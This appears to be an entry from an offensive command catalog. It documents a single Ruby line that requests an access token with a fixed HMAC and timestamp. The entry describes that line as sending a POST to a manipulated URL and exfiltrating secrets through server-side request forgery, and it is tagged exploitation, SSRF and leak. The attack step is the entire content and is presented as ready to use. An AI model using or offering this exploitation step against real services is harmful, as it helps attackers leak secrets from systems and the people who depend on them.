---
id: cmd-uuid-6
data: >-
  access_token =
  session.request_token({'hmac'=>'d54d830d05601f0b4247f654e4c57b51318be655f40c7a7119141c98a23f6815','timestamp':'2000000000'})
tags:
  - exploitation
  - ssrf
  - leak
type: command
output: Triggers SSRF request leaking data
executor: ruby
platforms:
  - Ruby
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:39:18.726Z'
verified: false
validated: true
submitted: true
---
# request-token-with-leak

## Command

```ruby
access_token = session.request_token({'hmac'=>'d54d830d05601f0b4247f654e4c57b51318be655f40c7a7119141c98a23f6815','timestamp':'2000000000'})
```

## Description

Requests an access token, triggering an HTTP POST to the manipulated URL and exfiltrating secrets via SSRF.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| params | Hash with hmac and timestamp | Yes |

## Examples

### Basic Usage

```ruby
access_token = session.request_token({'hmac'=>'d54d830d05601f0b4247f654e4c57b51318be655f40c7a7119141c98a23f6815','timestamp':'2000000000'})
```

## Expected Output

SSRF POST with form data leaks; token response if successful.

## Related

- [[commands/create-shop-session]]
